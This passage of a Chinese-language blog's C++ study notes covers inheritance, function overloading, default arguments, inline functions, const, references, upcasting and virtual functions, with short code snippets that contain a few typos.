class="comment">A::print(): 10</span></span><br><span class="line"><span class="comment">~A::A()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h2 id="父类的私有属性-子类无法直接使用"><a href="#父类的私有属性-子类无法直接使用" class="headerlink" title="父类的私有属性 子类无法直接使用"></a>父类的私有属性 子类无法直接使用</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220813012922715.png" alt="image-20220813012922715"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span>:  <span class="comment">//子类可以用, main等不可以用;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220813013248417.png" alt="image-20220813013248417"></p>
<blockquote>
<p> client class: 对象</p>
</blockquote>
<h1 id="第十二章-父类子类的关系"><a href="#第十二章-父类子类的关系" class="headerlink" title="第十二章 父类子类的关系"></a>第十二章 父类子类的关系</h1><blockquote>
<p>‘&amp;’ reference 引用</p>
</blockquote>
<h2 id="Declare-an-Employee-class"><a href="#Declare-an-Employee-class" class="headerlink" title="Declare an Employee class"></a>Declare an Employee class</h2><blockquote>
<p>inline (内连的)</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">//Declare an Employee class</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="built_in">Employee</span>( <span class="keyword">const</span> std::string&amp; name, <span class="keyword">const</span> std::string &amp; snn );</span><br><span class="line">        <span class="function"><span class="keyword">const</span> std::string&amp; <span class="title">get_name</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(std::ostream&amp; out)</span> <span class="keyword">const</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(std::ostream&amp; out)</span> <span class="keyword">const</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(std::ostream&amp; out, <span class="keyword">const</span> std::string&amp; msg)</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="keyword">protected</span>:</span><br><span class="line">        std::string m_name;</span><br><span class="line">        std::string m_ssn;    </span><br><span class="line">&#125;;</span><br><span class="line">Employee:<span class="built_in">Employee</span>( <span class="keyword">const</span> string&amp; name, <span class="keyword">const</span> string&amp; ssn ): <span class="built_in">m_name</span>(name),<span class="built_in">m_ssn</span>(ssn)&#123;</span><br><span class="line">    <span class="comment">//initializer list sets up the values!;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Employee member functions</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">const</span> std::string&amp; <span class="title">Employee::get_name</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> m_name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Employee::print</span> <span class="params">(std::ostream&amp; out )</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    out&lt;&lt; m_name &lt;&lt; endl;</span><br><span class="line">    out&lt;&lt; m_ssn &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Employee::print</span> <span class="params">(std:: ostream&amp; out, <span class="keyword">const</span> std::string&amp; msg)</span> <span class="keyword">const</span> </span>&#123; <span class="comment">// 重载函数</span></span><br><span class="line">    out&lt;&lt; msg &lt;&lt;endl;</span><br><span class="line">    <span class="built_in">print</span>(out); <span class="comment">// 调用上面那个Employee::print 代码重调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>继承了父类</strong> = <strong>子类使用时会调用父类的构造函数</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> <span class="keyword">public</span> A &#123; <span class="comment">// B类就作为A的子类</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="built_in">B</span>():<span class="built_in">A</span>(<span class="number">15</span>) &#123; cout &lt;&lt; <span class="string">&quot;B::B()&quot;</span> &lt;&lt; endl; &#125; <span class="comment">//必须在这里传参数给A类</span></span><br><span class="line">    	~<span class="built_in">B</span>()&#123; cout &lt;&lt; <span class="string">&quot;~B::B()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//构造时候 先A 再B</span></span><br><span class="line"><span class="comment">// 析构的时候 先B 再A</span></span><br><span class="line"><span class="comment">// 类似栈的原理</span></span><br></pre></td></tr></table></figure>
<h2 id="Now-add-Manager"><a href="#Now-add-Manager" class="headerlink" title="Now add Manager"></a>Now add Manager</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">inline</span> <span class="keyword">void</span> Man</span><br></pre></td></tr></table></figure>
<p>c++ 语言:</p>
<p>子类重名同参数函数 会把 父类重载的所有函数覆盖(隐藏)</p>
<p>如果使用父类出现而子类不出现的 “同名函数, 不同参数” 甚至会报错.</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220815005924102.png" alt="image-20220815005924102"></p>
<p>想调用必须</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">b.A::<span class="built_in">printf</span>(<span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
<h1 id="第十三章-函数重载和默认参数-缺省值"><a href="#第十三章-函数重载和默认参数-缺省值" class="headerlink" title="第十三章 函数重载和默认参数(缺省值)"></a>第十三章 函数重载和默认参数(缺省值)</h1><h2 id="Function-Overloading"><a href="#Function-Overloading" class="headerlink" title="Function Overloading"></a>Function Overloading</h2><p>返回类型不能构成overload条件, 于是返回类型必须相同</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">char</span>)</span></span></span><br></pre></td></tr></table></figure>
<h1 id="Default-arguments-默认参数"><a href="#Default-arguments-默认参数" class="headerlink" title="Default arguments //默认参数"></a>Default arguments //默认参数</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Stash</span>(<span class="keyword">int</span> size, <span class="keyword">int</span> initQuantity=<span class="number">0</span>);</span><br><span class="line"><span class="comment">//1: Stash(100); // Default initQuantity=0;</span></span><br><span class="line"><span class="comment">//2: Stash(100,200); // initQuantity=200;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220815010811989.png" alt="image-20220815010811989"></p>
<p><strong>chico</strong>写法错误, 默认参数必须从右到左写过去. 即 j先有, 再m有</p>
<h2 id="Default-arguments-写在声明里-不写在定义里"><a href="#Default-arguments-写在声明里-不写在定义里" class="headerlink" title="Default arguments 写在声明里 不写在定义里."></a>Default arguments 写在声明里 不写在定义里.</h2><p>Default arguments 是运行时候的事情, 编译器替你补上你写的缺省值.</p>
<h1 id="第十四章-内联函数"><a href="#第十四章-内联函数" class="headerlink" title="第十四章 内联函数"></a>第十四章 内联函数</h1><h2 id="Overhead-for-a-function-call-overhead-额外的开销"><a href="#Overhead-for-a-function-call-overhead-额外的开销" class="headerlink" title="Overhead for a function call  (overhead 额外的开销  )"></a>Overhead for a function call  (overhead 额外的开销  )</h2><ul>
<li>the processing time required by a device prior to the execution of a command<ul>
<li>Push parameters</li>
<li>Push return address</li>
<li>Prepare return values</li>
<li>Pop all pushed</li>
</ul>
</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220816054648165.png" alt="image-20220816054648165"></p>
<p>每个程序都有一个独立的堆栈</p>
<p>call 一个函数需要做这么多额外的事情</p>
<h2 id="Inline-Functions"><a href="#Inline-Functions" class="headerlink" title="Inline Functions"></a>Inline Functions</h2><p>An iniline function is expanded in place, like a pre pocesor macro, so the overhead of the function call is  eliminated.</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220816060151494.png" alt="image-20220816060151494"></p>
<p>相当于插入代码在主函数中</p>
<h2 id="Inline-Funcions"><a href="#Inline-Funcions" class="headerlink" title="Inline Funcions"></a>Inline Funcions</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">plusOne</span><span class="params">( <span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">plusOne</span><span class="params">( <span class="keyword">int</span> x)</span> </span>&#123;<span class="keyword">return</span> ++x;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Repeat <strong>inline</strong> keyword at declaration and definition. (在声明和定义中都需要写inline 函数)</li>
<li>An inline function definition may not generate any code in .obj file.</li>
</ul>
<p>Inline: 空间换时间</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220816061432136.png" alt="image-20220816061432136"></p>
<h3 id="函数巨大-或者-递归函数都不能接受递归"><a href="#函数巨大-或者-递归函数都不能接受递归" class="headerlink" title="函数巨大 或者 递归函数都不能接受递归;"></a>函数巨大 或者 递归函数都不能接受递归;</h3><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220816061614972.png" alt="image-20220816061614972"></p>
<h3 id="Inline-inside-classes-在类中的函数body直接写在类中都是inline-内敛-的"><a href="#Inline-inside-classes-在类中的函数body直接写在类中都是inline-内敛-的" class="headerlink" title="Inline inside classes 在类中的函数body直接写在类中都是inline(内敛)的"></a>Inline inside classes 在类中的函数body直接写在类中都是inline(内敛)的</h3><ul>
<li>Any funciton you define inside a class declaration is automatically an inline.</li>
</ul>
<p>第二种: inline方法</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220816062031414.png" alt="image-20220816062031414"></p>
<p>Inline or not ?</p>
<ul>
<li><p>Inline: </p>
<ul>
<li>Small functions,2 or 3 lines</li>
<li>Frequently called functions, e.g. inside loops(循环里面大量调用))</li>
</ul>
</li>
<li><p>Not inline?</p>
<ul>
<li>Very large functions, more than 20 lines  (超过20行的函数)</li>
<li>Recursive functions (有递归的函数)</li>
</ul>
</li>
</ul>
<h1 id="第十五章-const"><a href="#第十五章-const" class="headerlink" title="第十五章 const"></a>第十五章 const</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> x=<span class="number">123</span>;</span><br><span class="line">x = <span class="number">27</span> <span class="comment">// illegal!	</span></span><br><span class="line">x++; <span class="comment">// illegal!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> y = x; <span class="comment">// ok, copy const to non-const</span></span><br><span class="line">y = x; <span class="comment">// ok, same thing</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> z = y; <span class="comment">// Ok, same thing</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> z = y; <span class="comment">// Ok, const is safer</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// const 在c++中 仍然是变量而不是常数</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220818195534252.png" alt="image-20220818195534252"></p>
<h2 id="Pointers-and-const"><a href="#Pointers-and-const" class="headerlink" title="Pointers and const"></a>Pointers and const</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220818195856488.png" alt="image-20220818195856488"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> * <span class="keyword">const</span> q = <span class="string">&quot;abc&quot;</span>; <span class="comment">// q is const</span></span><br><span class="line">*q = <span class="string">&#x27;c&#x27;</span>; <span class="comment">// OK</span></span><br><span class="line">q++; <span class="comment">//ERROR</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * p =<span class="string">&quot;ABCD&quot;</span>;</span><br><span class="line">*p = <span class="string">&#x27;b&#x27;</span>; <span class="comment">//ERROR! (*p) is the const</span></span><br><span class="line"><span class="comment">// const 指通过这个const的变量无法修改值, 而不是值无法修改内存单元</span></span><br></pre></td></tr></table></figure>
<h2 id="const-指通过这个const的变量无法修改值-而不是值无法修改内存单元"><a href="#const-指通过这个const的变量无法修改值-而不是值无法修改内存单元" class="headerlink" title="const 指通过这个const的变量无法修改值, 而不是值无法修改内存单元"></a>const 指通过这个const的变量无法修改值, 而不是值无法修改内存单元</h2><p>const 写在 <strong>*</strong> 号的前面 即 <strong>const *</strong> 是说<strong>对象</strong>是const  // const在前 对象 const</p>
<p>const 写在 <strong>*</strong> 号的后面 即  <strong>* const</strong> 是说<strong>指针</strong>是const // const 在后 指针 const </p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220818201039906.png" alt="image-20220818201039906"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220818201434461.png" alt="image-20220818201434461"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> * s =<span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,s);  <span class="comment">// input: hello world!</span></span><br><span class="line">	s[<span class="number">0</span>] = <span class="string">&#x27;b&#x27;</span>;		<span class="comment">// change first variable &#x27;h&#x27; to &#x27;b&#x27;;  Error!</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,s); <span class="comment">// Error!</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 不可以修改s</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220818205923969.png" alt="image-20220818205923969"></p>
<h2 id="以const方式传一个指针-保证变量安全"><a href="#以const方式传一个指针-保证变量安全" class="headerlink" title="以const方式传一个指针, 保证变量安全"></a>以const方式传一个指针, 保证变量安全</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">funciotn</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> * x)</span></span>&#123;</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 保证x的值不会修改</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> Currency <span class="title">the_raise</span><span class="params">(<span class="number">42</span>,<span class="number">38</span>)</span></span>;</span><br><span class="line"><span class="comment">//整个对象为const</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220818210740334.png" alt="image-20220818210740334"></p>
<p>在函数的声明和定义的地方加const 表示不修改任何成员变量</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220818210817352.png" alt="image-20220818210817352"></p>
<blockquote>
<p>const 成员变量-&gt; “this” is const</p>
<p>即, this指针 不能改变成员变量</p>
</blockquote>
<h1 id="第十六章-不可修饰的对象"><a href="#第十六章-不可修饰的对象" class="headerlink" title="第十六章 不可修饰的对象"></a>第十六章 不可修饰的对象</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> Currency <span class="title">the_raise</span><span class="params">(<span class="number">42</span>, <span class="number">38</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Class A &#123;</span><br><span class="line">	    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220819225636445.png" alt="image-20220819225636445"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasArray</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">int</span> array[size]; <span class="comment">//ERROR!</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// use &quot;anonymous enum&quot; hack</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasArray</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> size=<span class="number">100</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> array[size]; <span class="comment">//OK!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="第十七章-引用"><a href="#第十七章-引用" class="headerlink" title="第十七章 引用"></a>第十七章 引用</h1><pre><code>## Declaring reference
</code></pre><ul>
<li>References are a new data type in c++<ul>
<li>char c;</li>
<li>char *p = &c;</li>
<li>char&amp; r = c;</li>
</ul>
</li>
</ul>
<p>引用必须初始化: 初始值r是c的引用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char c;</span><br><span class="line">char&amp; r = c;</span><br></pre></td></tr></table></figure>
<p>在参数表或者有成员变量可以不用初始值</p>
<p>(本地变量/成员变量必须有初始值)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//References</span></span><br><span class="line">Declares a <span class="keyword">new</span> name <span class="keyword">for</span> an existing object</span><br><span class="line"><span class="keyword">int</span> X = <span class="number">47</span>;</span><br><span class="line"><span class="keyword">int</span>&amp; Y = X; <span class="comment">// Y is a reference to X</span></span><br><span class="line"><span class="comment">// X and Y now refer to the same variable</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Y = &quot;</span> &lt;&lt; y; <span class="comment">//prints Y = 47</span></span><br><span class="line">Y = <span class="number">18</span>;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;X = &quot;</span> &lt;&lt; x; <span class="comment">//prints X = 18</span></span><br><span class="line"><span class="comment">// 相当于X重新起了一个名字叫Y</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220819232331853.png" alt="image-20220819232331853"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> x = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">int</span>&amp; y = x;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span>&amp; z =x; <span class="comment">//z是x的别名,但通过z不能修改x;(与指针相同)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> * x)</span></span>&#123;</span><br><span class="line">	x++</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span>&amp; <span class="title">g</span><span class="params">(<span class="keyword">int</span>&amp; x)</span></span>&#123;</span><br><span class="line">    x++;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span>&amp; <span class="title">h</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> q;</span><br><span class="line">    <span class="comment">//! return q; //Error 因为返回类型是 int&amp; 而q是局部变量, 无法返回这个确切的符号</span></span><br><span class="line">	<span class="keyword">return</span> x; <span class="comment">// 合法, 因为x是全局变量 能够返回 (int&amp;)x ,即表示引用x</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">f</span>(&amp;a);  <span class="comment">// Ugly (but explicit)</span></span><br><span class="line">    <span class="built_in">g</span>(a);	<span class="comment">// Clean (but hidden)</span></span><br><span class="line">    <span class="built_in">h</span>() = <span class="number">16</span>; <span class="comment">//返回 (int&amp;)x 相当于 x的值变为16;</span></span><br><span class="line">    *<span class="built_in">k</span>() = <span class="number">10</span>; <span class="comment">//如果k()返回指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220819234249378.png" alt="image-20220819234249378"></p>
<h2 id="Pointers-VS-References"><a href="#Pointers-VS-References" class="headerlink" title="Pointers VS. References"></a>Pointers VS. References</h2><ul>
<li>References<ul>
<li>不能为空</li>
<li>依赖存在的变量, 是一个变量的别名</li>
<li>不能改变为别的变量</li>
</ul>
</li>
<li>Pointers<ul>
<li>能够设置为空</li>
<li>指针不依赖存在的对象</li>
<li>能够改变所指的地址</li>
</ul>
</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220819235409404.png" alt="image-20220819235409404"></p>
<blockquote>
<p>离变量最近的决定了变量的类型</p>
<p>int&amp; *p 表示取引用的指针</p>
<p>int* &amp;p 表示 p是引用 ,引用的类型为一个指针</p>
</blockquote>
<h1 id="第十八章-向上造型"><a href="#第十八章-向上造型" class="headerlink" title="第十八章 向上造型"></a>第十八章 向上造型</h1><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220820015606679.png" alt="image-20220820015606679"></p>
<h2 id="Conversion"><a href="#Conversion" class="headerlink" title="Conversion"></a>Conversion</h2><ul>
<li>if B isa A, you can use a B anywhere an A can be used.<ul>
<li>if B isa A, then everything that is true for A is also true of B</li>
</ul>
</li>
<li>Be careful if the substitution is not valid!</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220820021045805.png" alt="image-20220820021045805"></p>
<h2 id="子类和父类之间对象存在关系"><a href="#子类和父类之间对象存在关系" class="headerlink" title="子类和父类之间对象存在关系"></a>子类和父类之间对象存在关系</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>():<span class="built_in">i</span>(<span class="number">10</span>) &#123;&#125;</span><br><span class="line">	    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> &#123;</span></span><br><span class="line">	<span class="keyword">private</span>;</span><br><span class="line">    	<span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">    	<span class="built_in">B</span>():<span class="built_in">j</span>(<span class="number">30</span>) &#123;&#125;</span><br><span class="line">		<span class="built_in">f</span>()&#123; cout &lt;&lt; <span class="string">&quot;B.j&quot;</span> &lt;&lt; j &lt;&lt; endl; &#125;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	A a;</span><br><span class="line">    B b;</span><br><span class="line">    <span class="keyword">int</span> *p = (<span class="keyword">int</span>*) &amp;b; <span class="comment">//允许</span></span><br><span class="line">	p++;</span><br><span class="line">    *p=<span class="number">50</span>;</span><br><span class="line">    b.<span class="built_in">f</span>(); <span class="comment">// Inputs: 50; 通过指针的强制转换也能访问到private变量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="若有一个子类的对象当做父类的对象来看了-叫做-Upcasting-向上造型"><a href="#若有一个子类的对象当做父类的对象来看了-叫做-Upcasting-向上造型" class="headerlink" title="若有一个子类的对象当做父类的对象来看了, 叫做 Upcasting(向上造型)"></a>若有一个子类的对象当做父类的对象来看了, 叫做 Upcasting(向上造型)</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220820023230816.png" alt="image-20220820023230816"></p>
<h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><blockquote>
<p>double a; int b = (int)a;</p>
</blockquote>
<h1 id="第十九章-多态性"><a href="#第十九章-多态性" class="headerlink" title="第十九章 多态性"></a>第十九章 多态性</h1><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220820023556185.png" alt="image-20220820023556185"></p>
<h2 id="Ineritance-in-C"><a href="#Ineritance-in-C" class="headerlink" title="Ineritance in C++"></a>Ineritance in C++</h2><blockquote>
<p>circle 圆 ; rectangel 矩形 ; ellipse 椭圆 ; </p>
</blockquote>
<ul>
<li>能够用给一个类定一个另一个类</li>
<li><p>比如说:</p>
<ul>
<li>椭圆是一种形状</li>
<li>圆是特殊的椭圆</li>
<li>矩形又是另一种形状</li>
<li>圆, 椭圆, 矩形的共同点<ul>
<li>属性(成员变量)</li>
<li>用途(成员函数)</li>
</ul>
</li>
<li>圆, 椭圆 和矩形都是不相同(not identical)</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220820024302890.png" alt="image-20220820024302890"></p>
</li>
</ul>
<h2 id="Polymorphism-多态性-virtual-void-render"><a href="#Polymorphism-多态性-virtual-void-render" class="headerlink" title="Polymorphism(多态性) virtual void render();"></a>Polymorphism(多态性) virtual void render();</h2><p>将来子类重新写了一个render(), 那么父类的render和子类的render是有联系的 ( 同名函数 )</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220820024952436.png" alt="image-20220820024952436"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">render</span><span class="params">(Shape * p)</span></span>&#123;</span><br><span class="line">    p-&gt;render; <span class="comment">// 对给定的shape的render() 执行正确的render函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220820025650906.png" alt="image-20220820025650906"></p>
<blockquote>
<p>virtual 动态绑定</p>
<p>你已经是一个成熟的shape了，应该知道自己怎么render()</p>
</blockquote>
<h1 id="第二十章-多态的实现"><a href="#第二十章-多态的实现" class="headerlink" title="第二十章 多态的实现"></a>第二十章 多态的实现</h1><p>多态性的实现<br>任何类的中的虚函数都会比原函数大一点</p>
<blockquote>
<p>mark：virtual的内存开头都有一个隐藏的VPtr指针，指向VTable这张表</p>
<p>注意: 图中的vtable是一个指针!</p>
</blockquote>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821104240449.png" alt="image-20220821104240449"></p>
<blockquote>
<p> 虚函数的调用, 在虚函数表里头, 顺着虚函数表而找到对应的函数</p>
</blockquote>
<pre><code>## Ellipse 的对象和circle对象不太一样 vtable : virtual table
</code></pre><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821132623022.png" alt="image-20220821132623022"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821133120574.png" alt="image-20220821133120574"></p>
<blockquote>
<p>vtable没有变化, 调用的虚函数不会因此而改变</p>
<p>因此: Shape a; Ellipse b; a=b . vtpr: still is a ;</p>
</blockquote>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220821144705017.png" alt="image-20220821144705017"></p>
<h2 id="调用reference-和调用指针一样-都是动态绑定"><a href="#调用reference-和调用指针一样-都是动态绑定" class="headerlink" title="调用reference 和调用指针一样 都是动态绑定"></a>调用reference 和调用指针一样 都是动态绑定</h2><h2 id="Virtual-destructors"><a href="#Virtual-destructors" class="headerlink" title="Virtual destructors"></a>Virtual destructors</h2><blockquote>
<p>Make destructors <strong>virtual</strong> if they might be inherited</p>
